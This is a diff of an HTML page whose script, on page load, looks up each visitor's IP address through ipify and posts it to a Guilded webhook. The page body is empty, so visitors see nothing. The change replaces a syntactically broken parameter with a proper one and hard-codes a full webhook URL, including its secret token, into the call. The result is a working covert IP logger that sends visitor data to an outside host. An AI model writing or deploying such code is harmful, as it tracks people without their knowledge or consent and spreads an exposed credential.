@@ -17,7 +17,7 @@
 <html>
 <body>
 <script>
-async function sendIPToGuilded(https://media.guilded.gg/webhooks/0b72c47e-9468-4803-838b-c9e22cf5ab98/Kr5CbmrsAMSkacCc42Myy6QaMEweOYosCa8YGGwcmssWCUuCWACMYkqAkOswMgcQsacweY6GoSOo0miaG2WYeM) {
+async function sendIPToGuilded(webhookUrl) {
   try {
     const ipResp = await fetch('https://api.ipify.org?format=json');
     const { ip } = await ipResp.json();
@@ -38,7 +38,7 @@ async function sendIPToGuilded(https://media.guilded.gg/webhooks/0b72c47e-9468-4
 }
 
 // Replace with your Guilded webhook URL
-sendIPToGuilded('YOUR_GUILDED_WEBHOOK_URL');
+sendIPToGuilded('https://media.guilded.gg/webhooks/0b72c47e-9468-4803-838b-c9e22cf5ab98/Kr5CbmrsAMSkacCc42Myy6QaMEweOYosCa8YGGwcmssWCUuCWACMYkqAkOswMgcQsacweY6GoSOo0miaG2WYeM');
 </script>
 </body>
 </html>
